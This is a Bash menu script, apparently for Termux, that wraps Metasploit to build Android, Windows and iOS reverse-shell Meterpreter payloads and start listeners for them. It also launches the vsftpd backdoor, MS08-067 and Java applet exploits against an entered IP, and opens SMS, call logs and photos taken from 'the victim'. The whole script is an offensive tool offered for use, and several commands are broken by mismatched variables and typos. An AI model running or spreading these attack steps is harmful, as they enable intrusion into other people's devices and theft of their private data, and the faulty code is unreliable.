clear

#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install

echo -e "$green "

figlet  -f big "           MetaSploit  "
echo -e "$blue"

echo -e
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
echo ""
echo -e $yellow	'Welcome In MetaSploit 2019 U Can Injoy With Me'
echo ""
echo -e $red 'Code By Saeed Ahmeed'
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#echo -e "$green"
echo -e "$cyan"
echo -e "|---{$yellow my ip$cyan }---| "
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
#date
echo -e "$yellow"
sleep 1
#echo ''
echo -e "$red                                          [00]back"
echo -e "$cyan"
echo "            [1]payload android ????????"
echo "            [2]payload windows ????????"
echo "            [3]Android penetration msf ????????"
echo "            [4]windows penetration msf ????????"
echo "            [5]Breakthrough via Port (21)????"
echo "            [6]Breakthrough via Port (445)????"
echo "            [7]open (sms,calllog,....txt) The victim ????????   "
echo "            [8]Open the victim files that you downloaded ???? "
echo "            [9]Breakthrough by malicious link ???"
echo "            [10]error metasploit ??????             "
echo "            [11]Download msf (5.0.0)??????"
echo "            [12]payload ios ???????"
echo -e "$green"
read -p "     number------->  " Zoal
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
if [ $Zoal -eq 1 ]
then
echo -e $yellow " please insert LHOST :>"
read -p "                       LHOST----->" host
echo -e $yellow " please insert port :>"
read -p "                       LPORT----->" lport
echo -e $yellow " please insert Name payload :>"
read -p "                       Name----->" name
echo -e $red " please insert path :>"
read -p "                    Path----->" path
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
bash metasploit.sh
fi

if [ $Zoal -eq 2 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
bash metasploit.sh
fi
if [ $Zoal -eq 3 ]
then
echo -e $blue "Please Insert LHOST :>"
read -p "                    LHOST----->" host
echo -e $blue "Please Insert PORT :>"
read -p "                    LPORT----->" lport
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'

fi

if [ $Zoal -eq 4 ]
then

echo -e $white "Please Insert LHOST :>"
read -p "                     LHOST----->" host
echo -e $white "Please Insert PORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 

if [ $Zoal -eq 5 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip

msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'set payload cmd/unix/interact' -x 'set RHOST $ip' -x 'set RPORT 21' -x 'exploit'

fi

if [ $Zoal -eq 6 ]
then
msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'setpayload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'

fi

if [ $Zoal -eq 7 ]
then
echo -e "$red"
echo ""
echo -e "$green    "
cd $HOME/MetaSploit/.msf && ls
echo ""
read -p "name.txt ------> " n
fi
if [ "$n" -eq "0"  ]; then
cd $HOME/MetaSploit
metasploit.sh
else
termux-open $n
fi

if [ $Zoal -eq 8 ]
then
echo -e "$red"
echo ""
echo -e "$green    "
cd $HOME/MetaSploit/.msf && ls
echo ""
read -p "name photo ------> " n
echo -e "$green"
fi
if [ "$n" -eq "0"  ]; then
cd $HOME/MetaSploit
metasploit.sh
else
termux-open $n
echo ""
fi

if [ $Zoal -eq 10 ]
then
echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh
fi

if [ $Zoal -eq 11 ]
then
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
git clone https://github.com/rapid7/metasploit-framework
bundle install
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
gem install crass -v '1.0.4' --source 'https://rubygems.org/'
cd metasploit-framework
bundle update nokogiri
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
sleep 1
metasploit.sh
fi

if [ $Zoal -eq 12 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
fi

if [ $Zoal -eq 9 ]
then
echo -e $green "Please Insert SRVHOST :>"
read -p "                     LHOST----->" host
echo -e $green "Please Insert SRVPORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/browser/java_signed_applet' -x 'set SRVHOST '$host -x 'set SRVPORT '$port -x 'set URLPATH /exploit ' -x 'set AAPLETNAME google_unix4 ' -x 'exploit'
fi
fi

if [ $Zoal -eq 00 ]
then
clear 
figlet -f mono12.tlf "Good Bye"
exit
fi
